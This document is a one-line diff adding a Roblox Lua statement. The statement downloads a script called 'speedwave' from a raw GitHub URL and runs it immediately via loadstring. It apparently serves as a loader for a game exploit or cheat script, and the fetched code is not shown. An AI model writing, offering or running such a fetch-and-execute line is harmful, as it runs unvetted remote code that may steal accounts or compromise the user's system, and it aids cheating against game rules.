@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/maSgok-fubtox-9garto/speedwave-/main/speedwave"))()
